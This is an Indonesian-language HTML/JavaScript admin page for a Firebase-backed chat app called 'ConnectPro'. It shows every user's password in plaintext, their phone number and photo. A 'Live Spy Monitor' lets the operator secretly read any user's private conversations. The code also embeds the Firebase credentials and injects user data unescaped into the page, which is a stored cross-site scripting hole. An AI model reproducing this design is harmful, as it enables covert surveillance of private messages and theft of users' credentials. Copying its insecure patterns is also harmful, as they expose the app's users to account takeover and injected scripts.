<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Master Admin - ConnectPro</title>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        :root {
            --bg: #020617;
            --card: #1e293b;
            --primary: #6366f1;
            --danger: #ef4444;
            --text: #f8fafc;
            --border: #334155;
        }

        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background: var(--bg);
            color: var(--text);
            margin: 0;
            display: flex;
            flex-direction: column;
            height: 100vh;
        }

        /* --- HEADER --- */
        header {
            background: var(--card);
            padding: 20px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--border);
        }

        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            padding: 20px 40px;
        }

        .stat-card {
            background: var(--card);
            padding: 20px;
            border-radius: 16px;
            border: 1px solid var(--border);
            text-align: center;
        }

        .stat-card h3 { margin: 0; font-size: 0.9rem; color: #94a3b8; }
        .stat-card p { margin: 10px 0 0; font-size: 1.8rem; font-weight: 700; color: var(--primary); }

        /* --- CONTENT --- */
        main {
            padding: 0 40px 40px;
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 30px;
            flex: 1;
            overflow: hidden;
        }

        .table-section, .spy-section {
            background: var(--card);
            border-radius: 20px;
            border: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        .section-header {
            padding: 20px;
            background: rgba(255,255,255,0.03);
            border-bottom: 1px solid var(--border);
            font-weight: 700;
        }

        .scroll-area {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
        }

        /* --- TABLE STYLE --- */
        table {
            width: 100%;
            border-collapse: collapse;
        }

        th {
            text-align: left;
            color: #94a3b8;
            font-size: 0.8rem;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--border);
        }

        td {
            padding: 15px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            font-size: 0.85rem;
        }

        .avatar { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; }
        .pw-text { font-family: monospace; color: #fbbf24; font-weight: bold; }
        .tag { padding: 4px 8px; border-radius: 6px; font-size: 0.7rem; font-weight: bold; }
        .male { background: #1e40af; }
        .female { background: #9d174d; }

        /* --- SPY AREA --- */
        .chat-log-item {
            background: #0f172a;
            border-radius: 10px;
            padding: 10px;
            margin-bottom: 10px;
            font-size: 0.8rem;
        }

        .chat-bubble {
            margin: 5px 0;
            padding: 5px 10px;
            border-radius: 5px;
            background: #1e293b;
        }

        .btn-spy {
            background: var(--primary);
            border: none;
            color: white;
            padding: 5px 10px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.75rem;
        }

        .btn-del {
            background: var(--danger);
            border: none;
            color: white;
            padding: 5px 10px;
            border-radius: 6px;
            cursor: pointer;
            margin-left: 5px;
        }

        .hidden { display: none; }
    </style>
</head>
<body>

    <header>
        <div style="display:flex; align-items:center; gap:15px;">
            <i class="fas fa-user-shield fa-2x" style="color:var(--primary);"></i>
            <h1 style="margin:0; font-size:1.5rem;">ConnectPro Admin Dashboard</h1>
        </div>
        <button class="btn-del" onclick="window.location.reload()" style="background:#475569;">Refresh Data</button>
    </header>

    <div class="stats-container">
        <div class="stat-card">
            <h3>Total User</h3>
            <p id="statUsers">0</p>
        </div>
        <div class="stat-card">
            <h3>Laki-laki</h3>
            <p id="statMale">0</p>
        </div>
        <div class="stat-card">
            <h3>Perempuan</h3>
            <p id="statFemale">0</p>
        </div>
    </div>

    <main>
        <section class="table-section">
            <div class="section-header"><i class="fas fa-users"></i> Database Pengguna</div>
            <div class="scroll-area">
                <table>
                    <thead>
                        <tr>
                            <th>FOTO</th>
                            <th>ID / NAMA</th>
                            <th>PASSWORD</th>
                            <th>NO HP</th>
                            <th>GENDER</th>
                            <th>AKSI</th>
                        </tr>
                    </thead>
                    <tbody id="userTableBody">
                        </tbody>
                </table>
            </div>
        </section>

        <section class="spy-section">
            <div class="section-header"><i class="fas fa-comment-slash"></i> Live Spy Monitor</div>
            <div class="scroll-area" id="spyContainer">
                <p style="text-align:center; color:#64748b; margin-top:50px;">Pilih user untuk mengintip percakapan</p>
            </div>
        </section>
    </main>

<script>
    // --- FIREBASE CONFIG ---
    const firebaseConfig = {
        apiKey: "AIzaSyBSo0nFUKNBDmUX0wSFV_idAFWBRnnTcXE",
        authDomain: "fotobooth-e36ab.firebaseapp.com",
        databaseURL: "https://fotobooth-e36ab-default-rtdb.firebaseio.com",
        projectId: "fotobooth-e36ab",
        storageBucket: "fotobooth-e36ab.firebasestorage.app",
        messagingSenderId: "1040239629485",
        appId: "1:1040239629485:web:254a7b50a4243b6c5d6224"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // --- LOAD DATA ---
    function initAdmin() {
        db.ref('users').on('value', snap => {
            const tbody = document.getElementById('userTableBody');
            tbody.innerHTML = "";
            
            let count = 0, male = 0, female = 0;

            snap.forEach(user => {
                const d = user.val();
                const id = user.key;
                count++;
                if(d.gender === 'Laki-laki') male++;
                if(d.gender === 'Perempuan') female++;

                tbody.innerHTML += `
                    <tr>
                        <td><img src="${d.pfp || 'https://via.placeholder.com/50'}" class="avatar"></td>
                        <td><b>${id}</b><br><span style="color:#94a3b8; font-size:0.75rem;">${d.nama}</span></td>
                        <td class="pw-text">${d.pw}</td>
                        <td>${d.wa || '-'}</td>
                        <td><span class="tag ${d.gender === 'Perempuan' ? 'female' : 'male'}">${d.gender || 'N/A'}</span></td>
                        <td>
                            <button class="btn-spy" onclick="spyUser('${id}')">Intip</button>
                            <button class="btn-del" onclick="deleteUser('${id}')"><i class="fas fa-trash"></i></button>
                        </td>
                    </tr>
                `;
            });

            document.getElementById('statUsers').innerText = count;
            document.getElementById('statMale').innerText = male;
            document.getElementById('statFemale').innerText = female;
        });
    }

    // --- SPY LOGIC ---
    function spyUser(userId) {
        const spyBox = document.getElementById('spyContainer');
        spyBox.innerHTML = `<h4>Menyadap: <span style="color:var(--primary)">${userId}</span></h4>`;
        
        // Cari riwayat kontak user tersebut
        db.ref(`contacts/${userId}`).once('value', snap => {
            if(!snap.exists()) {
                spyBox.innerHTML += `<p style="color:var(--danger)">User ini belum pernah chat.</p>`;
                return;
            }

            snap.forEach(contact => {
                const partnerId = contact.key;
                const roomId = [userId, partnerId].sort().join("_");
                
                const roomDiv = document.createElement('div');
                roomDiv.className = 'chat-log-item';
                roomDiv.innerHTML = `<strong>Lawan Chat: ${partnerId}</strong><hr style="border:0; border-top:1px solid #334155; margin:5px 0;">`;
                
                // Ambil pesan dalam room tersebut
                db.ref(`messages/${roomId}`).limitToLast(10).once('value', mSnap => {
                    mSnap.forEach(msg => {
                        const m = msg.val();
                        const sender = m.sender === userId ? "USER" : "LAWAN";
                        roomDiv.innerHTML += `
                            <div class="chat-bubble">
                                <span style="color:${m.sender === userId ? '#6366f1' : '#94a3b8'}; font-weight:bold;">${sender}:</span> 
                                ${m.type === 'vn' ? '🎤 [Voice Note]' : m.text}
                            </div>`;
                    });
                });
                spyBox.appendChild(roomDiv);
            });
        });
    }

    // --- DELETE USER ---
    function deleteUser(id) {
        if(confirm(`Hapus permanen akun ${id}? Tindakan ini tidak bisa dibatalkan.`)) {
            db.ref(`users/${id}`).remove();
            alert("User telah dihapus.");
        }
    }

    initAdmin();
</script>
</body>
</html>
